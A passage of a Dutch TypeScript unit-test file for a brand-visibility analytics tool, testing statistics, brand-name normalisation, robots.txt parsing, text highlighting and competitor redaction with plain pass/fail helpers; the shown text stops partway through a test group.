/**
 * Eenheidstests voor de rekenkundige en tekstverwerkende kern.
 *
 * Draai met `npm run test:unit`. GEEN database, GEEN API-sleutel, GEEN kosten,
 * daarom kan dit bij elke wijziging draaien in plaats van alleen als iemand
 * eraan denkt.
 *
 * ── WAAROM DEZE FUNCTIES EN NIET MEER ───────────────────────────────────────
 *
 * Alles hier is puur: invoer erin, uitvoer eruit, geen netwerk. Dat is bewust de
 * scheidslijn geweest bij het bouwen, telkens als er een stuk logica ontstond
 * waar het stil mis kon gaan (een normalisatie, een drempel, een percentage),
 * is dat uit de databasecode getrokken naar een eigen module zonder
 * `server-only`. Precies die modules staan hieronder.
 *
 * Wat hier NIET in staat: alles wat de database of OpenAI nodig heeft. Dat is
 * niet te testen zonder een echt project, en een test met een nagebootste
 * database toetst vooral of je nabootsing klopt.
 */
import { binomialStderr, weightedScoreStderr, confidenceBand, changeIsMeaningful } from "@/lib/stats/uncertainty";
import {
  normalizeEntityName,
  isSameEntity,
  pickCanonicalName,
  looksLikeBrandName,
  textContainsName,
  citesOwnSite,
} from "@/lib/entities/normalize";
import { bandFromEstimate, volumeBandOf, isVolumeBand, VOLUME_BANDS, VOLUME_FACTOR } from "@/lib/pipeline/volume";
import { promptWeight, NEUTRAL_WEIGHT } from "@/lib/pipeline/prompt-weight";
import { parseRobots, isAllowed, sitemapsFrom } from "@/lib/audit/robots";
import { splitByTerms } from "@/lib/highlight";
import { redactCompetitors, containsCompetitor } from "@/lib/pipeline/redact";
import { resolveTargets, readRecommendations } from "@/lib/pipeline/recommendation";
import type { RawRecommendation, CodedMissedPrompt } from "@/lib/pipeline/recommendation";
import { geoScore, geoIssues } from "@/lib/schemas/critique";
import type { GeoCriteria } from "@/lib/schemas/critique";
import { compare, deltaOf, thresholdOf, verdictOf, minQuestionsForSignal } from "@/lib/pipeline/impact-math";
import { buildChangeBlock, isWorthEmailing } from "@/lib/pipeline/period-change-format";
import type { PeriodChange } from "@/lib/pipeline/period-change-format";
import { domainOf } from "@/lib/offsite/domain";
import { checkUrlFormat, isInternalHostname, isInternalIp } from "@/lib/url";
import { csvCell } from "@/lib/csv";
import { sanitizeForPostgres, hasUnstorableChars } from "@/lib/pg-text";
import { countOpenPeriodicMeasurements } from "@/lib/jobs/pending";
import { formatEvidenceDossier, excerpt } from "@/lib/pipeline/evidence-format";
import type { EvidenceEntry } from "@/lib/pipeline/evidence-format";
import { stripUnsupportedClaims, validateField, NEUTRAL_FALLBACK } from "@/lib/pipeline/validate-claims";
import { normalizePosition, averagePosition, weightedAveragePosition } from "@/lib/pipeline/position";
import { shareByRun, sumShare, roundQuestions } from "@/lib/pipeline/question-share";
import {
  numberFacts,
  formatFactCard,
  isSupported,
  claimKey,
  topicKey,
  factFromAnswer,
  mergeAnsweredFacts,
  sourceCoverage,
} from "@/lib/pipeline/factcard";
import {
  selectBriefingQuestions,
  slotQuestions,
  describeSkipped,
  positioningQuestion,
  MAX_QUESTIONS,
} from "@/lib/pipeline/briefing-select";
import type { BriefingQuestion } from "@/lib/pipeline/briefing-select";
import { checkContentGate, openingVan, geoRegels } from "@/lib/pipeline/content-gate";
import {
  brandNav,
  generalNav,
  hoofdstukken,
  isActive,
  isExact,
  HOOFDSTUKKEN,
  HOOFDSTUK_ICOON,
} from "@/lib/nav";
import { ICONEN } from "@/lib/icons";
import { DOORVERWIJZINGEN } from "@/lib/redirects";
import { findGaps, gapLink } from "@/lib/profile-gaps";
import {
  gapQuestions,
  isGapQuestion,
  GAP_REASON,
  GAP_SOURCE,
  MAX_GAP_QUESTIONS,
} from "@/lib/pipeline/gap-questions";
import {
  beschikbareWaarden,
  filterLibrary,
  libraryTotals,
  pagineer,
  LEGE_FILTERS,
  type LibraryRow,
} from "@/lib/library";
import { kiesVoorBulk, bulkMelding } from "@/lib/plan-bulk";
import { leesHerkomst, terugLink } from "@/lib/origin";
import {
  contentMix,
  funnelVoortgang,
  planTotalen,
  type Funnelfase,
  type VoortgangPagina,
} from "@/lib/plan-progress";
import { activiteit, ALLE_TAAKSOORTEN, TAAK_TEKST } from "@/lib/activity";
import {
  ADMIN_SECTIES,
  ONBOARDING_TAKEN,
  doorlooptijden,
  duurSeconden,
} from "@/lib/onboarding-insight";
import {
  besteEnZwakste,
  ctr as gscCtr,
  dagenTussen,
  gewogenPositie,
  klikkenPerType,
  normaliseerUrl,
  perDag as perDagGsc,
  perPagina as perPaginaGsc,
  totalen as gscTotalen,
  verschuif,
  vergelijk,
  vorigVenster,
  type GscDag,
} from "@/lib/search-console/metrics";

import { splitSentences, stripMarkdown, firstSentences } from "@/lib/pipeline/sentences";
import { extractHeadings, renderMarkdown } from "@/lib/markdown";
import { topicTerms, canonicalPath, scorePage, selectRelevantPages } from "@/lib/pipeline/page-relevance";
import { verifyAtoms } from "@/lib/pipeline/atom-verify";
import { verifyDossierFacts, answerTypeOf } from "@/lib/pipeline/dossier-verify";
import { wilsonBounds, maySkip, elicitLabel, describeElicit } from "@/lib/pipeline/elicit-rate";
import { planFactMerge, describeContradictions } from "@/lib/pipeline/fact-merge";
import type { IncomingFact, StoredFact } from "@/lib/pipeline/fact-merge";
import { detectClaimSentences, claimMatchesSentence, detectedCoverage } from "@/lib/pipeline/claim-extract";
import { resolveTuning, isReasoningModel, isUnsupportedTemperatureError } from "@/lib/openai/sampling";
import { estimateCostUsd, hasKnownRate } from "@/lib/openai/pricing";
import { MODELS } from "@/lib/openai/models";
import {
  harvestStructuredData,
  extractJsonLdBlocks,
  extractMetaTags,
  assessRendering,
} from "@/lib/pipeline/structured-data";
import {
  detectPageTemplate,
  aggregateTemplateProfile,
  templateSummary,
} from "@/lib/pipeline/template-detect";
import { buildTemplateExport, markdownToGutenbergBlocks } from "@/lib/pipeline/content-export";
import { buildBrandRankings, ownMentionCount } from "@/lib/pipeline/brand-rankings";
import {
  assessInventory,
  looksLikeProductPage,
  buildTaxonomy,
} from "@/lib/pipeline/inventory-quality";
import {
  isProductSitemap,
  isProductUrl,
  isSitemapIndex,
  extractLocs,
  sameDomain,
  sectionOf,
  parseUrlList,
} from "@/lib/crawl-urls";
import { scoreUrl, selectUrls } from "@/lib/pipeline/url-priority";
import { buildPageBlocks } from "@/lib/pipeline/page-select";
import {
  entityConsistencyChecks,
  normalizeBrand,
  sameBrand,
} from "@/lib/audit/entity-consistency";
import { dedupe } from "@/lib/jobs/dedupe";
import {
  buildVerdict,
  checkFacts,
  checkableFacts,
  knowsBrand,
  admitsUnknown,
  describeVerdict,
  scoreCategoryAnswer,
  describeCategory,
  cleanCompetitorName,
  summariseKnows,
  describeKnows,
  baselineFacetState,
  type BaselineVerdict,
} from "@/lib/pipeline/baseline-verdict";
import { quoteOnPage, quoteConfidence } from "@/lib/pipeline/quote-check";
import {
  harvestTextFacts,
  mergeTextFacts,
  isCanonicalPage,
  trimStreet,
} from "@/lib/pipeline/text-facts";
import { relinkOfferingIds } from "@/lib/pipeline/topic-link";
import {
  onboardingStats,
  onboardingHeadline,
} from "@/lib/pipeline/onboarding-summary";
import {
  assessReadiness,
  readinessHeadline,
} from "@/lib/pipeline/profile-readiness";
import { isActiveAccount, monthsSinceStart } from "@/lib/account-status";
import {
  inviteState,
  passwordRules,
  passwordOk,
  mayInvite,
} from "@/lib/invite-rules";
import { EDITABLE_PROFILE_FIELDS } from "@/lib/profile-editable";
import { MONTHS_AHEAD, DEFAULT_FUNNELS } from "@/lib/plan-constants";
import {
  monthCalendar,
  isRunningMonth,
  isPastMonth,
  spreadDates,
  resequenceMonth,
  datumProbleem,
} from "@/lib/plan-schedule";
import { sharedNotice } from "@/lib/plan-overview";
import {
  filterBacklog,
  sortBacklog,
  clusterCounts,
  potentieLabel,
  raaktLabel,
  LEGE_BACKLOG_FILTERS,
  type BacklogItem,
} from "@/lib/plan-backlog";
import {
  PLAN_STATUS_META,
  planRunningDate,
  shouldStartWriting,
  countActionRequired,
  SCHRIJFVOORSPRONG_DAGEN,
} from "@/lib/plan-status";
import {
  writeDecision,
  writeBlockNotice,
  planBriefing,
  contentTypeFor,
  type PageForWriting,
} from "@/lib/plan-writing";
import { swapWithNeighbour, canMove, type OrderablePage } from "@/lib/plan-order";
import {
  contentHref,
  filterCounts,
  formatDagNL,
  isCurrentMonth,
  matchesFilter,
  monthCalendarLabel,
  nextPublication,
  openMonthIds,
} from "@/lib/plan-overview";
import { brandScorePerPeriod } from "@/lib/brand-score";
import { ronde, rondeZin } from "@/lib/ronde";
import { actionNeedsStaff, STAFF_ONLY_ACTIONS } from "@/lib/cost-rules";
import { navActief } from "@/lib/nav";
import { openVragenTotaal, openVragenLabel } from "@/lib/open-questions-count";
import { eindpoort } from "@/lib/content-final-gate";
import { leesMaandKeuze, maandRegel, planStap, telStatussen } from "@/lib/plan-read";
import {
  isEersteMaand,
  overzichtCijfers,
  totalenKop,
  planRegels,
  versheidsregel,
  volgendeMeting,
} from "@/lib/overview";
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import {
  containsRegion,
  geoBalance,
  droppableIndices,
  isLokaal,
  REGIO_DREMPEL,
  regionGateMessage,
} from "@/lib/pipeline/geo-share";
import { COST_DENIED } from "@/lib/cost-rules";
import { requireCount } from "@/lib/require-count";
import { mayMeasureAgain, MIN_DAGEN_TUSSEN_PERIODES } from "@/lib/measure-cadence";
import {
  visibilityIndex,
  potentialScore,
  potentialBand,
  potentialExplanation,
  distributePotentialByWeight,
} from "@/lib/potential";
import {
  DEFAULT_MIX,
  checkMix,
  describeMix,
  isDefaultMix,
  mixTotal,
  resolveMix,
} from "@/lib/prompt-mix";
import { readKey } from "@/lib/search-console/key-state";
import {
  confirmationMatches,
  deletionLines,
  deletionWarning,
  deletionBlockade,
} from "@/lib/deletion-rules";
import {
  spendVerdict,
  combinedVerdict,
  limitFromEnv,
  DEFAULT_MONTHLY_LIMIT_EUR,
  DEFAULT_DAILY_LIMIT_EUR,
} from "@/lib/spend-rules";
import { EDITABLE_ACCOUNT_FIELDS } from "@/lib/account-editable";
import { checkNewEmail, checkNewPassword } from "@/lib/account-security";
import {
  opportunities,
  reachLabel,
  OPPORTUNITY_ICON,
  OPPORTUNITY_ACTION_LABEL,
  paginaPad,
  potentieVarieert,
  reachShort,
} from "@/lib/opportunities";
// `lib/work.ts` is `server-only`; de pure helft ervan staat in `lib/work-kind.ts`.
import { workChipTone, workKindIcon, type WorkKind } from "@/lib/work-kind";
import { leesbaarWaarom } from "@/lib/recommendation-text";
import { insights } from "@/lib/insights";
import { normalizeProperty } from "@/lib/search-console/property";
import { syncWindow, heeftWerk, EERSTE_RONDE_DAGEN } from "@/lib/search-console/window";
import {
  CSM_SEGMENTS,
  CSM_SEGMENT_META,
  segmentOf,
  flagsOf,
  needsAttention,
  totals,
  sortForCsm,
  unresolvedFailures,
  type CsmBrand,
  type JobOutcome,
} from "@/lib/csm";
import {
  BRAND_FIELDS,
  CLIENT_STEPS,
  SESSION_STEPS,
  STEP_META,
  STEP_ORDER,
  fieldsOfStep,
  isFilled,
  stepProgress,
  overallProgress,
} from "@/lib/pipeline/brand-fields";
import { resolveWriteSource, consultantFields } from "@/lib/profile-source";
import {
  profileStage,
  STAGE_LABEL,
  STAGE_NEXT,
  STAGE_ORDER,
} from "@/lib/profile-stage";
import { sessionMeter, notApplicableFields } from "@/lib/profile-meter";
import { buildIntakeBlock } from "@/lib/pipeline/intake-block";
import {
  categoryOf,
  examplesFor,
  exampleCount,
  CATEGORIES,
  CATEGORY_LABEL,
  type BrandCategory,
} from "@/lib/pipeline/brand-examples";
import {
  planRefresh,
  refreshConfirmation,
  FIELD_TASKS,
  TASK_LABELS,
} from "@/lib/pipeline/onboarding-refresh";
import {
  topicSteering,
  growthRegionsRule,
  objectionsRule,
  offlineProofFacts,
  forbiddenTopicHits,
  siteStructureRule,
  goalRule,
} from "@/lib/pipeline/commercial-context";
import { ONBOARDING_NEXT, nextInChain } from "@/lib/jobs/chain";
import { extractConfusions } from "@/lib/pipeline/baseline-verdict";
import {
  assessStructureCoverage,
  describeCoverage,
  formatCoverageForReport,
} from "@/lib/pipeline/structure-gap";
import {
  validateOrRebuildJsonLd,
  schemaTypeFor,
  withFreshnessLine,
  bestaandeDatePublished,
} from "@/lib/schema-jsonld";
import { similarity, mostSimilar } from "@/lib/pipeline/similarity";
import { assessReadability, describeReadability } from "@/lib/pipeline/readability";
import { checkQuality } from "@/lib/pipeline/content-gate";
import { buildSteps, researchRunning, displaySteps } from "@/lib/pipeline/research-steps";
import {
  filterProtectedFields,
  confidenceLevel,
  isHumanSet,
  describeMerge,
  resolveScope,
  scopeSummary,
} from "@/lib/pipeline/field-merge";
import {
  parseContextFactors,
  technicalAdviceStale,
  staleAdviceNotice,
  extraAliasesFrom,
  extraRegionsFrom,
  discontinuedNames,
} from "@/lib/pipeline/context-factors";
import { formatDateShort, formatDateLong, formatRelativeTime, formatNumber } from "@/lib/format";
import { describeToneSliders, clampToneSlider } from "@/lib/pipeline/tone-sliders";
import { versionReasonLabel } from "@/lib/pipeline/version-reason";
import { checkTabooWords } from "@/lib/pipeline/content-gate";
import { slugFrom, suggestedPath, resolvedContentUrl, displayTitle } from "@/lib/pipeline/slug";
import { diffContent } from "@/lib/pipeline/content-diff";
import { FaqEdit } from "@/lib/schemas/content-piece";
import { ReputationSourceKinds } from "@/lib/schemas/reputation";
import {
  selectNodes,
  heaviestNodes,
  MAX_NODES_STANDARD,
  MAX_NODES_DEEP,
} from "@/lib/reputation/select-nodes";
import { selectRivals, MAX_RIVALS, MIN_MENTIONS } from "@/lib/reputation/select-rivals";
import { rotateParties, positionInOrder } from "@/lib/reputation/rotate";
import { scoreCriterion, summariseRanks, positionToScore } from "@/lib/reputation/rank";
import { measureOrderBias, rankIsIndicative, MIN_OBSERVATIONS } from "@/lib/reputation/order-bias";
import {
  toneIndex,
  evidenceScore,
  consistency,
  usableForTone,
  runIsUsable,
  toneDistribution,
  toneStderr,
  spreadSentence,
  WEAK_WEIGHT,
} from "@/lib/reputation/score";
import { instrumentVersion, comparableRuns, instrumentWarning, PROMPT_VERSION } from "@/lib/reputation/instrument";
import {
  compareRuns,
  compareSentence,
  snapshotFromRun,
  EVIDENCE_MIN_DELTA,
} from "@/lib/reputation/compare";
import type { RunSnapshot } from "@/lib/reputation/compare";
import { readMarketAnswer, summariseMarket, marketSentence, marketKey, MAX_NAMED } from "@/lib/reputation/market";
import { toneScore, toneWord, isToneLabel, TONE_LABELS } from "@/lib/reputation/tone";
import {
  buildOfferingViews,
  countPerProduct,
  evidenceGapSentence,
  evidenceWord,
  groupOfferings,
  marketSplitSentence,
  offeringSentence,
  reputationHeadline,
  reviewRatings,
  spreadOverOfferings,
  tonePercent,
  type AnswerRow,
  type MarketRow,
  type ScoreRow,
} from "@/lib/reputation/screen";
import {
  isUsablePoint,
  cleanPoints,
  dedupeSleutel,
  pointKind,
  experiencePoints,
  evidenceRemarks,
} from "@/lib/reputation/points";
import {
  citedUrlsFrom,
  isAggregator,
  knownKind,
  tallySources,
  sourceMixSentence,
  ratingIsAcceptable,
  REVIEW_PLATFORMS,
} from "@/lib/reputation/sources";
import { decideStep, budgetUsd, RUN_BUDGET_EUR, STEP_COST_USD } from "@/lib/reputation/budget";
import type {
  ProfileOffering,
  ProfileTopic,
  Entity,
  PlannedPageStatus,
} from "@/lib/types/database";

let passed = 0;
let failed = 0;
const failures: string[] = [];

function ok(name: string, condition: boolean, detail = "") {
  if (condition) {
    passed++;
  } else {
    failed++;
    failures.push(`${name}${detail ? `: ${detail}` : ""}`);
  }
}

/**
 * Gelijkheidscontrole die de WERKELIJKE waarde in de foutmelding zet.
 *
 * `ok("er zijn er 12", n === 12)` meldt bij een fout alleen dat het er geen 12
 * waren, niet hoeveel het er wél waren, en dan begint het zoeken opnieuw.
 */
function eq(name: string, actual: string, expected: string) {
  ok(name, actual === expected, actual === expected ? "" : `verwacht ${expected}, kreeg ${actual}`);
}

/** Zelfde als `eq()`, voor een getal (of `null`/`undefined`) in plaats van tekst. */
function eq2(name: string, actual: number | null | undefined, expected: number | null) {
  ok(name, actual === expected, actual === expected ? "" : `verwacht ${expected}, kreeg ${actual}`);
}

/**
 * Bronbestanden lezen, voor de controles die naar de code zelf kijken.
 *
 * Een ontbrekend bestand geeft een lege string en geen crash: de controle die
 * hem leest hoort dan te falen op zijn eigen assertie ("vraagt isStaff"), met
 * de bestandsnaam erbij. Een `ENOENT` halverwege de testrun zegt niet welke
 * regel hem veroorzaakte.
 */
function leesBestand(pad: string): string {
  try {
    return readFileSync(pad, "utf8");
  } catch {
    return "";
  }
}

/** Alle `.tsx`-bestanden onder een map, recursief. */
function tsxOnder(map: string): string[] {
  const uit: string[] = [];
  let inhoud: { name: string; isDirectory: () => boolean }[];
  try {
    inhoud = readdirSync(map, { withFileTypes: true, encoding: "utf8" });
  } catch {
    return uit;
  }
  for (const item of inhoud) {
    const pad = join(map, item.name);
    if (item.isDirectory()) uit.push(...tsxOnder(pad));
    else if (item.name.endsWith(".tsx")) uit.push(pad);
  }
  return uit;
}

function group(name: string, fn: () => void) {
  const before = failed;
  fn();
  const mark = failed === before ? "✓" : "✗";
  console.log(`  ${mark} ${name}`);
}

// ════════════════════════════════════════════════════════════════════════════
console.log("\nOnzekerheid van de score (optimalisatie.md 2.2)");

group("binomiale standaardfout", () => {
  const se30 = binomialStderr(12, 30);
  ok("12/30 ≈ 9", Math.abs(se30 - 9) < 0.5, `${se30}`);
  ok("95%-band ≈ ±18", confidenceBand(40, se30).margin === 18);
  // De "plus vier"-correctie: zonder deze zou 0/30 een marge van exact nul geven,
  // en dan beweert de app "0%, absoluut zeker" bij een steekproef van dertig.
  ok("0 van 30 geeft geen nulmarge", binomialStderr(0, 30) > 2);
  ok("30 van 30 geeft geen nulmarge", binomialStderr(30, 30) > 2);
  ok("geen metingen → 0", binomialStderr(0, 0) === 0);
  ok("meer metingen = smallere band", binomialStderr(36, 90) < se30);
});

group("gewogen standaardfout", () => {
  const flat = Array.from({ length: 30 }, (_, i) => ({ weight: 1, mentioned: i < 12 }));
  ok("gelijke gewichten == binomiaal", Math.abs(weightedScoreStderr(flat) - binomialStderr(12, 30)) < 0.05);
  // Eén dominante vraag verlaagt het effectieve aantal metingen (Kish), en dan
  // hoort de band breder te worden, niet gelijk te blijven.
  const skew = [{ weight: 100, mentioned: true }, ...Array.from({ length: 29 }, () => ({ weight: 1, mentioned: false }))];
  ok("scheve gewichten = bredere band", weightedScoreStderr(skew) > binomialStderr(12, 30));
  ok("leeg → 0", weightedScoreStderr([]) === 0);
  ok("gewicht 0 telt niet mee", weightedScoreStderr([...flat, { weight: 0, mentioned: true }]) === weightedScoreStderr(flat));
});

group("betekenisvolle verandering", () => {
  const se = binomialStderr(12, 30);
  ok("+4 punten is ruis", !changeIsMeaningful({ score: 44, stderr: se }, { score: 40, stderr: se }).changed);
  ok("+30 punten is echt", changeIsMeaningful({ score: 70, stderr: se }, { score: 40, stderr: se }).changed);
  ok("daling telt ook", changeIsMeaningful({ score: 5, stderr: se }, { score: 40, stderr: se }).changed);
  ok("band kapt af op 0 en 100", confidenceBand(3, 10).low === 0 && confidenceBand(97, 10).high === 100);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nMerknamen normaliseren (optimalisatie.md 2.4)");

group("normalisatie", () => {
  ok("rechtsvorm eraf", normalizeEntityName("Coolblue B.V.") === "coolblue");
  ok("domein eraf", normalizeEntityName("https://www.Coolblue.nl/tvs") === "coolblue");
  ok("accenten weg", normalizeEntityName("Café Zürich") === "cafe zurich");
  ok("twee rechtsvormen", normalizeEntityName("Jansen Holding BV") === "jansen");
  ok("nooit leeg", normalizeEntityName("BV") !== "");
  ok("leestekens weg", normalizeEntityName("Jansen & Zn.") === "jansen zn");
});

group("bedrijfsnaam of gewoon woord (R1.3-correctie)", () => {
  // Aanleiding: de claimvalidator stripte twee CORRECTE zinnen uit een
  // Fysi-Unique-rapport omdat "manuele therapie" en "fysiotherapie" als entiteit
  // in een relevante rol stonden. Dat zijn behandelvormen, geen bedrijven.
  // Alle namen hieronder komen letterlijk uit de productiedatabase.
  const echteMerken = [
    "SMC Amersfoort", "FysioAmersfoort", "Fysio Atelier Amersfoort", "FysioNieuwland",
    "fysiolution.nl", "consumentenbond.nl", "Het Centrum - Vondelplein", "Bol.com", "EP.nl",
  ];
  for (const naam of echteMerken) {
    ok(`"${naam}" is een merknaam`, looksLikeBrandName(naam));
  }

  const generiek = [
    "fysiotherapie", "manuele therapie", "medische fitness", "sportfysiotherapie",
    "bekkenfysiotherapie", "hardloopkliniek", "fysiotherapiepraktijken", "medische fitnesscentra",
    "vergaderlocatie", "hotel", "wasmachine", "voorlader",
  ];
  for (const woord of generiek) {
    ok(`"${woord}" is GEEN merknaam`, !looksLikeBrandName(woord));
  }

  ok("lege naam telt niet", !looksLikeBrandName(""));
  ok("losse letter telt niet", !looksLikeBrandName("a"));
});

group("gelijk of niet", () => {
  ok("schrijfwijzen vallen samen", isSameEntity("Coolblue", "coolblue.nl"));
  // Bewust GEEN fuzzy matching: twee bedrijven samenvoegen vervalst de data stil,
  // ze apart laten staan is zichtbaar en door de klant op te lossen.
  ok("bijna-gelijke namen NIET samenvoegen", !isSameEntity("Bakkerij Jansen", "Bakkerij Hansen"));
  ok("lege naam matcht nooit", !isSameEntity("", ""));
  ok("mooiste schrijfwijze wint", pickCanonicalName(["coolblue.nl", "Coolblue"]) === "Coolblue");
});

group("staat de naam echt in de tekst? (vangnet op de mention-classificatie)", () => {
  // Aanleiding: de Swapfiets-analyse toonde "Jij wordt genoemd" op een antwoord
  // dat de merknaam nergens bevatte, het model had `mentioned: true` gegeven
  // zonder dat in de tekst terug te vinden.
  const swapfietsAntwoord =
    "De belangrijkste voordelen van een fietsabonnement ten opzichte van het kopen van een " +
    "eigen fiets zijn lagere kosten en onderhoud inbegrepen.";
  ok("merk niet in tekst → geen match", !textContainsName(swapfietsAntwoord, "Swapfiets"));
  ok(
    "merk wél in tekst → match",
    textContainsName("Swapfiets is een populaire aanbieder van fietsabonnementen.", "Swapfiets"),
  );
  ok(
    "hoofdletters en leestekens maken niet uit",
    textContainsName("Kies voor SWAP-FIETS als je flexibel wilt blijven.", "Swap Fiets"),
  );
  ok(
    "geen woordgrens → geen valse match",
    !textContainsName("De vakantie naar Kaapstad was geweldig.", "Aap"),
  );
  ok("lege naam matcht nooit", !textContainsName("Swapfiets is top.", ""));
});

group("citesOwnSite: de site van een concurrent herkennen zonder opgeslagen domein", () => {
  ok(
    "coolblue.nl hoort bij Coolblue",
    citesOwnSite(["https://www.coolblue.nl/product/12345"], "Coolblue"),
  );
  ok(
    "een subdomein telt ook mee (shop.coolblue.nl → coolblue.nl → coolblue)",
    citesOwnSite(["https://shop.coolblue.nl/aanbieding"], "Coolblue B.V."),
  );
  ok(
    "een heel ander domein matcht niet",
    !citesOwnSite(["https://www.tweakers.net/artikel/1"], "Coolblue"),
  );
  ok("geen bronnen is geen citatie", !citesOwnSite([], "Coolblue"));
  ok(
    "meerdere bronnen: al is er maar één de juiste",
    citesOwnSite(["https://www.tweakers.net/artikel/1", "https://www.coolblue.nl/"], "Coolblue"),
  );
  ok("een onleesbare URL crasht niet en matcht niet", !citesOwnSite(["niet-een-url"], "Coolblue"));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nVolumebanden en gewicht (optimalisatie.md 2.6)");

group("band uit schatting", () => {
  ok("60 → hoog", bandFromEstimate(60) === "hoog");
  ok("59 → midden", bandFromEstimate(59) === "midden");
  ok("24 → laag", bandFromEstimate(24) === "laag");
  ok("null → midden", bandFromEstimate(null) === "midden");
  ok("band wint van schatting", volumeBandOf({ volume_band: "laag", volume_estimate: 90 }) === "laag");
  ok("terugval op schatting", volumeBandOf({ volume_band: null, volume_estimate: 90 }) === "hoog");
  ok("onzin geweigerd", !isVolumeBand("gemiddeld") && isVolumeBand("hoog"));
});

group("promptgewicht", () => {
  // Deze gelijkheid houdt oude en nieuwe metingen vergelijkbaar: het neutrale
  // gewicht moest hetzelfde blijven toen de weging van 0-100 naar banden ging.
  ok("neutraal gewicht ongewijzigd", promptWeight("midden", "commercial") === NEUTRAL_WEIGHT);
  ok("onbekend = neutraal", promptWeight(null, null) === NEUTRAL_WEIGHT);
  ok("hoog + koopklaar is max", promptWeight("hoog", "transactional") === 1.0);
  ok("geen enkele prompt op 0", VOLUME_BANDS.every((b) => promptWeight(b, "informational") > 0));
  ok("factoren aflopend", VOLUME_FACTOR.hoog > VOLUME_FACTOR.midden && VOLUME_FACTOR.midden > VOLUME_FACTOR.laag);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nrobots.txt (optimalisatie.md 3.5)");

group("groepen en regels", () => {
  const allowed = (txt: string, ua: string, path = "/") => isAllowed(parseRobots(txt), ua, path);

  ok("alles dicht", !allowed("User-agent: *\nDisallow: /", "GPTBot"));
  ok("specifieke allow wint van wildcard", allowed("User-agent: *\nDisallow: /\n\nUser-agent: GPTBot\nAllow: /", "GPTBot"));
  ok("andere bots blijven dicht", !allowed("User-agent: *\nDisallow: /\n\nUser-agent: GPTBot\nAllow: /", "CCBot"));
  // Naïef lezen zou hier de hele site als geblokkeerd melden en de klant een
  // blokkade voorschotelen die er niet is.
  ok("langste regel wint: /blog open", allowed("User-agent: *\nDisallow: /\nAllow: /blog", "GPTBot", "/blog/x"));
  ok("langste regel wint: rest dicht", !allowed("User-agent: *\nDisallow: /\nAllow: /blog", "GPTBot", "/over-ons"));
  ok("gelijkspel: allow wint", allowed("User-agent: *\nDisallow: /pad\nAllow: /pad", "GPTBot", "/pad"));
  ok("gedeelde groep", !allowed("User-agent: A\nUser-agent: B\nDisallow: /", "B"));
  ok("nieuwe groep na een regel", allowed("User-agent: A\nDisallow: /\nUser-agent: B\nAllow: /", "B"));
  ok("* in patroon", !allowed("User-agent: *\nDisallow: /*.pdf", "GPTBot", "/map/x.pdf"));
  ok("$ ankert", !allowed("User-agent: *\nDisallow: /zoek$", "GPTBot", "/zoek"));
  ok("$ matcht geen langer pad", allowed("User-agent: *\nDisallow: /zoek$", "GPTBot", "/zoeken"));
  ok("lege disallow = alles mag", allowed("User-agent: *\nDisallow:", "GPTBot"));
  ok("leeg bestand = alles mag", allowed("", "GPTBot"));
  ok("commentaar genegeerd", !allowed("# x\nUser-agent: * # y\nDisallow: / # z", "GPTBot"));
  ok("sitemaps eruit", sitemapsFrom("Sitemap: https://a.nl/s.xml\nsitemap: https://a.nl/t.xml").length === 2);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nTekst markeren en opschonen (optimalisatie.md 3.1 / 4.3)");

group("markeren", () => {
  const marked = (t: string, terms: string[]) => splitByTerms(t, terms).filter((p) => p.term).map((p) => p.text);
  const rebuilt = (t: string, terms: string[]) => splitByTerms(t, terms).map((p) => p.text).join("");

  ok("tekst blijft heel", rebuilt("Ga naar Coolblue voor tv", ["Coolblue"]) === "Ga naar Coolblue voor tv");
  ok("hoofdletterongevoelig", marked("bij COOLBLUE en coolblue", ["Coolblue"]).length === 2);
  // Zonder "langste eerst" markeert "Bol" alleen het begin van "Bol.com".
  ok("langste term wint", marked("koop bij Bol.com", ["Bol", "Bol.com"])[0] === "Bol.com");
  // Met \b zou de grens op de punt breken; vandaar letters/cijfers als grens.
  ok("geen match binnen woord", marked("Coolbluezaken", ["Coolblue"]).length === 0);
  ok("wel match aan zinseinde", marked("Dat is Coolblue.", ["Coolblue"]).length === 1);
  ok("regex-tekens ontsnapt", marked("prijs (a+b) hier", ["(a+b)"]).length === 1);
  ok("term van 1 teken genegeerd", marked("a b c", ["a"]).length === 0);
});

group("concurrentnamen verwijderen", () => {
  const names = ["Coolblue", "Bol.com", "MediaMarkt"];
  ok("naam vervangen", redactCompetitors("Bij Coolblue vind je tv's.", names) === "Bij een andere aanbieder vind je tv's.");
  ok("niets blijft staan", !containsCompetitor(redactCompetitors("Kijk bij Bol.com.", names), names));
  // Een rijtje namen wordt anders drie keer dezelfde omschrijving achter elkaar,
  // en dat leest als een fout in plaats van als een weglating.
  ok("twee namen ingeklapt", redactCompetitors("Coolblue en MediaMarkt zijn groot.", names) === "andere aanbieders zijn groot.");
  ok("rijtje van drie ingeklapt", redactCompetitors("Opties: Coolblue, Bol.com, MediaMarkt.", names) === "Opties: andere aanbieders.");
  ok("losse zinnen blijven los", (redactCompetitors("Coolblue is snel. MediaMarkt heeft winkels.", names).match(/een andere aanbieder/g) ?? []).length === 2);
  ok("tekst zonder namen ongewijzigd", redactCompetitors("Geen naam hier.", names) === "Geen naam hier.");
  ok("lege namenlijst laat met rust", redactCompetitors("Coolblue", []) === "Coolblue");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nAanbevelingen en GEO-beoordeling (optimalisatie.md 4.1 / 4.5)");

const missed: CodedMissedPrompt[] = [
  { code: "V1", promptId: "p1", runId: "r1", text: "Beste cv-ketel?", cluster: "ketels", weight: 0.9 },
  { code: "V2", promptId: "p2", runId: "r2", text: "Wat kost onderhoud?", cluster: null, weight: 0.3 },
];
const rec = (ids: string[]): RawRecommendation => ({
  title: "T", type: "article", targetIntent: "i", why: "w", priority: 1,
  action: "nieuw", existingUrl: null, targetQuestionIds: ids,
});

group("vraagcodes oplossen", () => {
  ok("codes opgelost", resolveTargets([rec(["V1", "V2"])], missed)[0].targets.length === 2);
  ok("zwaarste eerst", resolveTargets([rec(["V2", "V1"])], missed)[0].targets[0].text === "Beste cv-ketel?");
  // Een model dat "V23" verzint mag geen kapotte koppeling opleveren.
  ok("verzonnen code weggegooid", resolveTargets([rec(["V1", "V99"])], missed)[0].targets.length === 1);
  ok("dubbele code één keer", resolveTargets([rec(["V1", "V1"])], missed)[0].targets.length === 1);
